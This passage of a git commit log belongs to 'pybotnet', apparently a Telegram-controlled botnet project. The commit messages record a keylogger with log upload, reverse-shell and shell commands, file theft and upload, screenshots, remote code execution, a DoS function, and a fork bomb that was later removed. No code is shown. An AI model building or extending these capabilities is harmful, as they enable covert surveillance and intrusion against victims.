+    add  doc string for system_info cashe
+
+commit 8bc81ad0413b18ecc9c1c64b6c5f9c6fa9848b43
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jun 8 17:33:40 2022 +0430
+
+    fix botnet._get_cashe
+
+commit 1b257bf5b269c0f16e4ef22a9b304b17368ad298
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jun 8 17:19:03 2022 +0430
+
+    add /get_file, /put_file, cashe for system info
+
+commit 6049ff07e00c9d6c313c427bc507d2527d8fad61
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jun 8 12:10:21 2022 +0430
+
+    remove *args from scripts, just send request if len script parameter > 1
+
+commit 1709fd238a7358c78276ce4fca63f1eaee6f31b2
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jun 1 17:23:25 2022 +0430
+
+    run pybotnet by ()
+
+commit c0367499dda8fcc410bebbed6042f7a88709c390
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jun 1 17:22:16 2022 +0430
+
+    if telegram not response, use proxy
+
+commit 7c437e9b30c8b1d7873688655e78bdee72090915
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jun 1 16:07:32 2022 +0430
+
+    add select_storage to upload_server_1
+
+commit 7bdb06e892b6f32ba6aba3b565f7b349de78c827
+Author: onionj <onionj98@gmail.com>
+Date:   Tue May 31 17:39:27 2022 +0430
+
+    fix upload_server_1 api link
+
+commit ef1a9094624b9d61ff977469633411f320a06dc9
+Author: onionj <onionj98@gmail.com>
+Date:   Tue May 31 17:31:03 2022 +0430
+
+    add pillw
+
+commit a417a4df97b7ae023901d1069116d6093cb92160
+Author: onionj <onionj98@gmail.com>
+Date:   Tue May 31 17:29:58 2022 +0430
+
+    fix upload_server_1 api link
+
+commit d311041d6d1b8cbe20335a10b8aeee10a8a730b3
+Author: onionj <onionj98@gmail.com>
+Date:   Tue May 31 17:27:20 2022 +0430
+
+    add /screenshot command
+
+commit 4868a62b9feb6a404badba7e1f2914f88cd89d86
+Author: onionj <onionj98@gmail.com>
+Date:   Tue May 31 14:19:13 2022 +0430
+
+    pep-8
+
+commit 37dc2a1d02e1fa673ebdc544c748ca36e501f3f4
+Author: onionj <onionj98@gmail.com>
+Date:   Fri May 27 23:44:25 2022 +0430
+
+    fix syntax
+    !
+
+commit 003679fdb7594557cc6a5057f02f861cf25fe3c9
+Author: onionj <onionj98@gmail.com>
+Date:   Fri May 27 23:27:07 2022 +0430
+
+    fix docs
+
+commit f45e9d0f2555ef38aff4909e6c2cbb25cb841588
+Author: onionj <onionj98@gmail.com>
+Date:   Fri May 27 23:07:34 2022 +0430
+
+    add comment
+
+commit c0ab716a5358240dec70b1b88ca6bf7ed3675fa6
+Author: onionj <onionj98@gmail.com>
+Date:   Fri May 27 22:54:07 2022 +0430
+
+    fix /shell command
+
+commit ef548e64d4f4053e5e4e471bd08da618a86bebbc
+Author: onionj <onionj98@gmail.com>
+Date:   Wed May 25 17:56:28 2022 +0430
+
+    add /reverse_shell command
+
+commit 7c3dd650b84bf647f21a7615568cac02a3f10635
+Author: onionj <onionj98@gmail.com>
+Date:   Wed May 25 15:37:18 2022 +0430
+
+    add /who doc
+
+commit d36b41a2dede3d66115754217ac570aa43aa7b53
+Author: onionj <onionj98@gmail.com>
+Date:   Wed May 25 12:31:57 2022 +0430
+
+    add /who command
+
+commit 2dbbaf1ad5481f4c110fb48b037fe1263b0d8db0
+Author: onionj <onionj98@gmail.com>
+Date:   Tue May 24 16:04:34 2022 +0430
+
+    fix telegram engine bug and add /help command
+
+commit d5ca59721fdd188872b23cdf899617f7eb5ce33d
+Author: onionj <onionj98@gmail.com>
+Date:   Tue May 24 11:44:39 2022 +0430
+
+    edit TelegramEngine._http_request
+
+commit 22605a3225886a14d49c5b2a2b17fec9d72969ec
+Author: onionj <onionj98@gmail.com>
+Date:   Mon May 16 19:17:01 2022 +0430
+
+    add telegram engine
+
+commit ae2aa4847220140682d6e868733069786de52a6e
+Author: onionj <onionj98@gmail.com>
+Date:   Mon May 16 11:13:11 2022 +0430
+
+    remove singleton engine, add BaseEngine.send_file
+
+commit d7106ccbbfabecfaaa2f756197d93a3cd7bf79ae
+Author: onionj <onionj98@gmail.com>
+Date:   Mon May 16 10:35:43 2022 +0430
+
+    refactor code, debug botnet
+
+commit dbeeb2019d340507b0822f702477e880286c2153
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Apr 5 17:08:51 2022 +0430
+
+    add botnet exceptions [User, Engine]
+
+commit 95961a5ac7fcca77fe470efe1970443e61050dca
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Apr 5 15:35:21 2022 +0430
+
+    add Todo
+
+commit d35d30999fedbc666d1c546d154ba4f84d01e36c
+Merge: 4d45eb3 8a75e99
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Thu Mar 31 11:01:05 2022 +0430
+
+    Merge pull request #27 from onionj/dependabot/pip/pillow-9.0.1
+    
+    Bump pillow from 9.0.0 to 9.0.1
+
+commit 8a75e99ba50a8d77dc8193181541672a293fb748
+Author: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>
+Date:   Sat Mar 12 00:59:44 2022 +0000
+
+    Bump pillow from 9.0.0 to 9.0.1
+    
+    Bumps [pillow](https://github.com/python-pillow/Pillow) from 9.0.0 to 9.0.1.
+    - [Release notes](https://github.com/python-pillow/Pillow/releases)
+    - [Changelog](https://github.com/python-pillow/Pillow/blob/main/CHANGES.rst)
+    - [Commits](https://github.com/python-pillow/Pillow/compare/9.0.0...9.0.1)
+    
+    ---
+    updated-dependencies:
+    - dependency-name: pillow
+      dependency-type: direct:production
+    ...
+    
+    Signed-off-by: dependabot[bot] <support@github.com>
+
+commit 2a24d3f61c58bc237d05c55efdcbb7895125f90c
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jan 20 10:21:21 2022 +0330
+
+    add Request
+
+commit c221d6ca2e97435b9da4bafa8689d2b0fc85240f
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jan 19 17:01:10 2022 +0330
+
+    edit typo
+
+commit 1c5f231f147f89767fb0f064b72fd3664acbd7a8
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jan 19 16:48:11 2022 +0330
+
+    add default scripts, external scripts
+
+commit db85e0f61ecc2ae56dace58c3b8ace0b9a1a5ed8
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jan 19 01:50:59 2022 +0330
+
+    move to 2.0.1
+
+commit 12535317d61d1775313f58d792cbfdabd92d9656
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jan 19 01:49:56 2022 +0330
+
+    add BotNet class, TestEngine
+
+commit 4d45eb34e59145a43a9593ff6bebf38fda0fd7fc
+Merge: f4ac7a1 5e84ba3
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Fri Jan 14 23:22:04 2022 +0330
+
+    Merge pull request #25 from onionj/dependabot/pip/pillow-9.0.0
+    
+    Bump pillow from 8.3.2 to 9.0.0
+
+commit 5e84ba37dcbfca8c5797222f6e6e9c2f51275e77
+Author: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>
+Date:   Thu Jan 13 03:51:23 2022 +0000
+
+    Bump pillow from 8.3.2 to 9.0.0
+    
+    Bumps [pillow](https://github.com/python-pillow/Pillow) from 8.3.2 to 9.0.0.
+    - [Release notes](https://github.com/python-pillow/Pillow/releases)
+    - [Changelog](https://github.com/python-pillow/Pillow/blob/main/CHANGES.rst)
+    - [Commits](https://github.com/python-pillow/Pillow/compare/8.3.2...9.0.0)
+    
+    ---
+    updated-dependencies:
+    - dependency-name: pillow
+      dependency-type: direct:production
+    ...
+    
+    Signed-off-by: dependabot[bot] <support@github.com>
+
+commit 1fc60ec959dfdf809814dfa3e5c1d6bb06ceda97
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Dec 31 05:07:38 2021 +0330
+
+    remove setting.py
+
+commit 5b1f90072356ec9fe3b190f57f6476794d32c8b7
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Dec 31 04:58:02 2021 +0330
+
+    create singleton class
+
+commit ffa55fba232b54c5c9025809bc4e36884825e9a7
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Dec 31 04:56:03 2021 +0330
+
+    change REQUIRES_PYTHON = ">=3.8.0"
+
+commit ce780a9366a6eaef82fb271915f83947fdf3f87a
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Dec 30 23:52:21 2021 +0330
+
+    edit engine import
+
+commit 986c92a989555f22eb66a8e688071c88f0bd067d
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Dec 30 23:52:01 2021 +0330
+
+    change methods name
+
+commit a93528cb735c49c6005300b7a0dd264db8aace58
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Dec 15 21:31:08 2021 +0330
+
+    add base model
+
+commit c639c9c2118f78baa9eb470d637f06494449f6eb
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Dec 11 10:56:05 2021 +0330
+
+    start version 2
+
+commit f4ac7a1da7023277235643d09ae178f5f9e672c3
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Nov 29 22:07:14 2021 +0330
+
+    up to '1.0.4',
+    Fixed a small issue
+
+commit ed97365c13ac28d5e35206145cc02d4fbafcaf1b
+Merge: ee535bb 09ffffe
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Mon Nov 29 21:19:03 2021 +0330
+
+    Merge pull request #21 from SepehrRasouli/master
+
+commit 09ffffe169207769b10c20f167a3b8e696c4af0c
+Author: SepehrRasouli <sepehrrs06@gmail.com>
+Date:   Sun Nov 28 12:35:00 2021 +0330
+
+    Minor Improvements
+
+commit bf1dfce8588320185fd660fade3257f7e6bd903d
+Author: SepehrRasouli <sepehrrs06@gmail.com>
+Date:   Sun Nov 28 12:28:31 2021 +0330
+
+    Tested the code and changed a few minor things.
+
+commit acc791b325aefb66ac9fc05e682c49d9108bfaf7
+Author: SepehrRasouli <sepehrrs06@gmail.com>
+Date:   Sun Nov 28 12:08:37 2021 +0330
+
+    Fixed a small issue , Will test the code now.
+
+commit ee535bb6560eedf7891dd09b5cb480ff2629cd30
+Merge: f796540 e52dc63
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Thu Nov 11 23:19:29 2021 +0330
+
+    Merge pull request #20 from SepehrRasouli/master
+    
+    Changed README.md
+
+commit e52dc636772251610b4683f410e1de0a0ab03fb7
+Merge: a2cbb5a f796540
+Author: SepehrRS <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Wed Nov 10 08:54:10 2021 +0330
+
+    Merge branch 'onionj:master' into master
+
+commit a2cbb5ae75090a68431acb37d6ee7e4cffd3a33e
+Author: SepehrRS <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Wed Nov 10 08:53:58 2021 +0330
+
+    Update README.md
+
+commit a447cad21a3f8aa64d67165ca4df3fe36ef07b69
+Author: SepehrRS <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Wed Nov 10 08:53:18 2021 +0330
+
+    Create README.md
+
+commit 09324a14ecc515ebb66777a100b7b6fe2a4a9b0d
+Author: SepehrRS <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Wed Nov 10 08:52:41 2021 +0330
+
+    Update README.md
+
+commit f79654061dfbdf0ab0239739c864899d1119b86e
+Merge: 6eb4cab 6d31e9f
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Fri Nov 5 21:30:46 2021 +0330
+
+    Merge pull request #19 from onionj/dependabot/pip/pillow-8.3.2
+    
+    Bump pillow from 8.3.1 to 8.3.2
+
+commit 6d31e9f1feea38e30ffc425a09601b85773518b6
+Author: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>
+Date:   Fri Nov 5 13:57:40 2021 +0000
+
+    Bump pillow from 8.3.1 to 8.3.2
+    
+    Bumps [pillow](https://github.com/python-pillow/Pillow) from 8.3.1 to 8.3.2.
+    - [Release notes](https://github.com/python-pillow/Pillow/releases)
+    - [Changelog](https://github.com/python-pillow/Pillow/blob/main/CHANGES.rst)
+    - [Commits](https://github.com/python-pillow/Pillow/compare/8.3.1...8.3.2)
+    
+    ---
+    updated-dependencies:
+    - dependency-name: pillow
+      dependency-type: direct:production
+    ...
+    
+    Signed-off-by: dependabot[bot] <support@github.com>
+
+commit 6eb4cab1a079e8d4927cca5cb6c86e9b08ac0630
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Oct 14 17:45:28 2021 +0330
+
+    debug help command| remove: &
+
+commit 495e645df4067df44de3b36501dc0e9c4b70fb97
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Oct 14 16:53:06 2021 +0330
+
+    up to 1.0.2 | Fixed some english grammer mistakes
+
+commit 53ddcb56205e20df45e4a264c35bfd8a997c8b78
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Oct 14 16:52:14 2021 +0330
+
+    remove  س
+
+commit 3a63828f9596b2723a656995b7a0b4ea20e351da
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Oct 14 16:51:58 2021 +0330
+
+    rename simple_code.py
+
+commit ab5b6200308919c4b091220d3bbf83299b58df1e
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Oct 14 16:51:40 2021 +0330
+
+    change example code
+
+commit a8be121eb64ed8aa7ad93a5d924a978a6c67cc18
+Merge: 0cbd19b c46613f
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Thu Oct 14 16:38:06 2021 +0330
+
+    Merge pull request #17 from SepehrRasouli/master
+    
+    Fixed some english grammer mistakes :D
+
+commit c46613f9a3e384c181020f7af365a5bb0956b194
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Thu Oct 14 10:54:28 2021 +0330
+
+    Fixed some english grammer mistakes :D
+
+commit 0cbd19b7374b8becd009a8ff2242af2fb238444b
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Oct 12 23:02:21 2021 +0330
+
+    upgrade to 1.0.1
+
+commit 75ce2a1e9b650efd42833267ff5fb1ac77eec992
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Oct 12 22:40:49 2021 +0330
+
+    test runcode on linux
+
+commit 0e8057d7e3d1a671264dedfdc110a130176d025e
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Oct 12 22:20:36 2021 +0330
+
+    fix pynput version
+
+commit 62801642fcd019c11fea5d8a80ae3e7dad8d3796
+Merge: 19fb07b 7b41334
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Tue Oct 12 22:19:42 2021 +0330
+
+    Merge pull request #16 from SepehrRasouli/master
+    
+    pep-8
+
+commit 7b413341e74cdd358522d6143575787a1dd9c9ad
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Tue Oct 12 22:18:16 2021 +0330
+
+    pep-8
+
+commit 19fb07b936c1ad1fd8f929545450a9ffbbe94d59
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Oct 12 22:02:44 2021 +0330
+
+    change readme.md
+
+commit ddfaec8e3dea3d9d59fbe759dea90e0e5dd85d56
+Merge: 4e223d9 b4b4cd8
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Tue Oct 12 21:58:56 2021 +0330
+
+    Merge pull request #15 from SepehrRasouli/master
+    
+    Removed Is Shell , Fixed README.MD , settings.py and added threading to commands
+
+commit b4b4cd8ff6f04ae6ac6930324870928c7453cf0f
+Author: SepehrRS <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Tue Oct 12 21:53:57 2021 +0330
+
+    Update util.py
+
+commit 0e37c8a8eca3107ec388b2943516b36e61f662d5
+Author: SepehrRS <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Tue Oct 12 21:51:10 2021 +0330
+
+    Update util.py
+
+commit 8c22f509c756301c06c3fd028e095638be4015e3
+Author: SepehrRS <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Tue Oct 12 21:47:30 2021 +0330
+
+    Update util.py
+
+commit 78222d10b31fdb90d0e5a542a64be02a4a245090
+Author: SepehrRS <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Tue Oct 12 21:14:15 2021 +0330
+
+    Update README.md
+
+commit f7f9661618fa8c028c715694db81dcf0d0689eda
+Author: SepehrRS <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Tue Oct 12 21:13:33 2021 +0330
+
+    Update README.md
+
+commit 3fd98bce3070e1678eb95ef28f6c15837e7b7bd6
+Author: SepehrRS <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Tue Oct 12 21:11:12 2021 +0330
+
+    Update settings.py
+
+commit 4de78b07d96f81d19f64ca97487a74da583b3caa
+Merge: a886203 4e223d9
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Tue Oct 12 21:06:04 2021 +0330
+
+    .
+
+commit a886203865437f358f706eba33e697c552adebc5
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Tue Oct 12 20:58:46 2021 +0330
+
+    Added timeout and removed is shell.
+
+commit 4e223d9958aa7897154dda0dc7a3bb673550ecdc
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Oct 9 22:52:10 2021 +0330
+
+    pep-8
+
+commit 7088c64b9fcecc0905a28c0079bb43db4b4c69e9
+Merge: dd66a15 6efb30c
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sat Oct 9 21:23:42 2021 +0330
+
+    Merge pull request #14 from SepehrRasouli/master
+    
+    Added dos function And RunCode
+
+commit 2c7c0e6a529887293ce8b8f51cd53c0dcf03dab4
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Sat Oct 9 19:30:42 2021 +0330
+
+    Added time out. gonna test it.
+
+commit 6efb30cd9a150b702bdf9c4f5fd9b666dd17ccc3
+Author: SepehrRS <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Fri Oct 8 12:40:16 2021 +0330
+
+    Update sample_code.py
+
+commit 1d7efa3de3f239469d330c0bba0c5d9998b7e3c1
+Author: SepehrRS <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Fri Oct 8 12:39:30 2021 +0330
+
+    Update sample_code.py
+
+commit abc80b2bf20b9a87131e8a40321bfda90ef03f41
+Author: SepehrRS <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Fri Oct 8 12:28:11 2021 +0330
+
+    Update README.md
+
+commit 1bade624c63e12ac7ee2bafa24670f7d2de77955
+Merge: fc8d9f3 aee5c3b
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Fri Oct 8 12:18:58 2021 +0330
+
+    Merge branch 'master' of https://github.com/SepehrRasouli/pybotnet
+
+commit fc8d9f3441184cde7d6da95cae683f2d276a0611
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Fri Oct 8 12:18:44 2021 +0330
+
+    Added runcode function to run python code directly from user !
+
+commit aee5c3b0d12c22400ba42ce9d22ab70ae97229ea
+Author: SepehrRS <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Thu Oct 7 19:30:16 2021 +0330
+
+    Update README.md
+
+commit 02902e42966b488fbcb676a7e7bcb7fda7534fe4
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Thu Oct 7 19:24:19 2021 +0330
+
+    Fixed readme.md and todolist.md
+
+commit 52d764c5adf08f51dba2819e06e578ff76d95196
+Merge: ac7abda dd66a15
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Thu Oct 7 19:20:24 2021 +0330
+
+    Merge branch 'master' of https://github.com/SepehrRasouli/pybotnet
+
+commit ac7abdae25a31104c8220f097519095bd7254910
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Thu Oct 7 19:19:54 2021 +0330
+
+    fixed doser. tested doser on windows
+
+commit 194aa17ec47510565e71d926c6cfacf28a00e3ae
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Thu Oct 7 12:25:41 2021 +0330
+
+    Added dos type and edited util.py.
+
+commit cb414fb33a8ba8b2ec34c10052d52e5cc22b9298
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Wed Oct 6 20:13:57 2021 +0330
+
+    Fixed class name and added dos function. will test the function now.
+
+commit 0ddbc398709db36c3740584dd877e3ff26af1c14
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Wed Oct 6 19:53:12 2021 +0330
+
+    <time-in-seconds> to <number-of--packets>
+
+commit 78a48f6c56e3d0520e0c722dbb8796299e30e480
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Wed Oct 6 19:48:00 2021 +0330
+
+    Added dos to commands list
+
+commit ae0d63083e964156fc85b48f29ea5c1a3df3c87c
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Wed Oct 6 19:22:33 2021 +0330
+
+    Fixed indents for more readability
+
+commit d6e24cc59563e74b1a0d8cf9f19cf5bccb5a634d
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Wed Oct 6 19:20:31 2021 +0330
+
+    Added ddos class to util.py
+
+commit dd66a1567a6a48049857e5bb6fdf979207037298
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Tue Oct 5 13:42:49 2021 +0330
+
+    Update README.md
+
+commit 90bc28c92dabb79ae0007ed62dfb326b6cf318cf
+Merge: e768808 aa71593
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Wed Sep 29 13:47:11 2021 +0330
+
+    Merge pull request #13 from SepehrRasouli/master
+    
+    Removed Fork Bomb , mem eater and memleft , and fixed local ip checker
+
+commit aa71593691c7ea6dce468126b1daa300217d3f99
+Author: SepehrRasouli <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Tue Sep 28 18:02:52 2021 +0330
+
+    Update README.md
+
+commit 3b8fd55f4f2ece88d681c73e746a50602a2bc812
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Mon Sep 27 11:37:34 2021 +0330
+
+    Fixed Everything
+
+commit 572dce47f262c53cbc0c3160688fb19a7543541e
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Mon Sep 27 09:34:52 2021 +0330
+
+    Removed fork bomb , eatmem and memleft since openurl does the same.
+
+commit 95e1c54de4d300a8e51853a117fa4f96ae9cbf67
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Mon Sep 27 09:32:34 2021 +0330
+
+    Fixed Local Ip Address
+
+commit e768808386f198b86e5ad7e644fb9235c1e7b784
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 25 23:15:26 2021 +0330
+
+    edit versions
+
+commit 708a737d465f220d592bda19f3ad0c911269a8c8
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 25 23:07:59 2021 +0330
+
+    upgrade to 0.25.3
+
+commit af4e209d4888a5150d85fc347ee1c2a0bfafc2b0
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 25 23:07:26 2021 +0330
+
+    test playsound on linux
+
+commit d8c093108980a560f1f8afa38d4a1148e693f16f
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 25 23:05:10 2021 +0330
+
+    add mp3 files
+
+commit 7f964cfcf03ffdeb768c5d538c9ad242a61e7b29
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 25 22:54:33 2021 +0330
+
+    pep 8 and fix memoryused name
+
+commit ed3fd9cc276877111abb035b3f26a0f6b3d00f4e
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 25 22:53:47 2021 +0330
+
+    test scheduler openurl memoryused on linux
+
+commit b233c2bdb94ff4244be86e434df84f551c8f437f
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 25 22:53:10 2021 +0330
+
+    add pustill
+
+commit a475263b3420d0fc995be796ab25364a29ccf0c4
+Merge: 3db75da 9296236
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sat Sep 25 22:25:13 2021 +0330
+
+    Merge pull request #12 from SepehrRasouli/master
+    
+    Fixed Schedule and README.md , Added forkbomb , openurl , memoryeater , sound player
+
+commit 92962369a38494d8c4cb80c3dd2e9481f14df5c8
+Author: SepehrRasouli <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Sat Sep 25 17:42:39 2021 +0330
+
+    Update requirements.txt
+
+commit 6c128a3f90876a3266a3d6f6415a58462a102665
+Author: SepehrRasouli <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Fri Sep 24 15:49:27 2021 +0330
+
+    Added forkbomb to readme.md
+
+commit acef80f16cc3cc01199b7bceec893e5c8c6d68e6
+Author: SepehrRasouli <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Fri Sep 24 15:48:27 2021 +0330
+
+    Update README.md
+
+commit e83feab207ac0aed8b1ddb2e353ee44b37290dd6
+Author: SepehrRasouli <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Fri Sep 24 15:47:25 2021 +0330
+
+    Update README.md
+
+commit ebe292d7f9b19d207aa5e8a233e49fbe314f2d2c
+Merge: 071bb2b 3db75da
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Fri Sep 24 15:40:07 2021 +0330
+
+    Fixed everything and added memory eater and etc.
+
+commit 071bb2bd6087e4beb672d9d9fd09bce4f73a084a
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Fri Sep 24 15:30:20 2021 +0330
+
+    Fixed Everything , Added memory eater , fork bomb , play sound and etc.
+
+commit 3db75da5f1fdf448d108944d3914ac56afbd08ff
+Merge: 795e693 549f2ab
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Fri Sep 24 13:54:58 2021 +0330
+
+    Merge pull request #11 from onionj/revert-10-master
+    
+    Revert "Added Task Scheduler"
+
+commit 549f2ab5e98b115b7d18eed517ab47463c8b6127
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Fri Sep 24 13:53:26 2021 +0330
+
+    Revert "Added Task Scheduler"
+
+commit 795e693936baf8f52ea83fc87104b81166dd45b9
+Merge: b13f35e 2841410
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Fri Sep 24 13:30:44 2021 +0330
+
+    Merge pull request #10 from SepehrRasouli/master
+    
+    Added Task Scheduler
+
+commit 28414101df33c5b91025c25bfc2ca415b55e2aa2
+Author: SepehrRasouli <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Thu Sep 23 08:03:26 2021 +0330
+
+    Update README.md
+
+commit 759edbb60e9938b38696a608004eb6d711ff958d
+Author: SepehrRasouli <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Wed Sep 22 18:48:42 2021 +0330
+
+    Update README.md
+
+commit 2d009fe2426b78880412c71397d79d99d7575cca
+Author: SepehrRasouli <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Wed Sep 22 18:47:57 2021 +0330
+
+    Update README.md
+
+commit f44c0b3906a4bc4e8b3466e5f2820bc23f6dfb7e
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Wed Sep 22 18:43:34 2021 +0330
+
+    Added task scheduler
+
+commit 84aa1e642c1766d02ba4437faa14dce83e986d59
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Wed Sep 22 17:04:03 2021 +0330
+
+    Added task scheduler , Will write the scripts now.
+
+commit b13f35ea7d2d2a25e4cedd172408eb8af4e211b9
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Sep 21 14:21:20 2021 +0430
+
+    update to 0.21.3
+
+commit a59fe502640de16d98e8a86fbed97afee5f047dd
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Sep 21 14:20:58 2021 +0430
+
+    add keylogger to Features
+
+commit 412893e60380b1aca512ffcb9ada1175164c70eb
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Sep 21 14:18:33 2021 +0430
+
+    upgrade to 0.21.2
+
+commit 92360360cfc2b3670b756a621abe43c203af4b33
+Merge: 4be1a07 60edb04
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Tue Sep 21 14:14:30 2021 +0430
+
+    Merge pull request #9 from SepehrRasouli/master
+    
+    Fixed README.md and added keylogger txt file deletion after uploading
+
+commit 60edb04f4938d22901ccd8629454af395ed597a2
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Tue Sep 21 10:23:50 2021 +0430
+
+    Fixed readme file and added keylogger
+
+commit 844193800fa9fa754d97f04b3ba6866c57125bc1
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Tue Sep 21 10:18:53 2021 +0430
+
+    added keylogger txt file deletion after zipping the keylog file and sending it to the user.
+
+commit 4be1a07c28320ed7b5f96d14b683642f12ee3dcf
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Sep 20 23:36:45 2021 +0430
+
+    if this previous_command do not send ofset message
+
+commit 7a9fc4af8c3a2693a0fc078d4905cd9c51072d75
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Sep 20 23:36:10 2021 +0430
+
+    add option to ignored_previous_command
+
+commit ace6dcb1f6851e2c1e6d607b2aa150018021ee9a
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Sep 20 22:31:15 2021 +0430
+
+    edit todo list
+
+commit 311bc9d4409934e85afc7565a9776b8cff809d00
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Sep 20 22:27:45 2021 +0430
+
+    update to 0.21.1, tanx to SepehrRasouli
+
+commit 39e04c1fc88ac0865f140afc6ddbdcf0ddde1a5d
+Merge: 2cab4db 3009295
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Mon Sep 20 22:26:14 2021 +0430
+
+    Merge pull request #8 from SepehrRasouli/master
+    
+    Added keylogger to pybotnet
+
+commit 300929502710e0ce45c4cf27ed5e1029ebe2a5ce
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
